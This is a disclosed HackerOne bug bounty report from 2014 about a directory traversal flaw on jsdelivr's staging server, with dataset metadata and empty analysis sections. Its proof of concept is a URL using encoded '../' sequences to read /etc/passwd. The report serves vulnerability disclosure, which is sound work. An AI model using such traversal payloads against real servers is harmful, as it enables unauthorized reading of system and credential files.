---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '18371'
original_report_id: '18371'
title: Directory Traversal at http://staging.jsdelivr.net/
weakness: Command Injection - Generic
team_handle: jsdelivr
created_at: '2014-06-29T09:37:24.289Z'
disclosed_at: '2014-08-20T15:28:58.159Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 3
tags:
- hackerone
- command-injection-generic
---

# Directory Traversal at http://staging.jsdelivr.net/

## Metadata

- HackerOne Report ID: 18371
- Weakness: Command Injection - Generic
- Program: jsdelivr
- Disclosed At: 2014-08-20T15:28:58.159Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

hi, 

Directory Traversal is a vulnerability which allows attackers to access restricted directories and execute commands outside of the web server's root directory.

POC: go this link ->  

http://staging.jsdelivr.net//..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af/etc/passwd

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
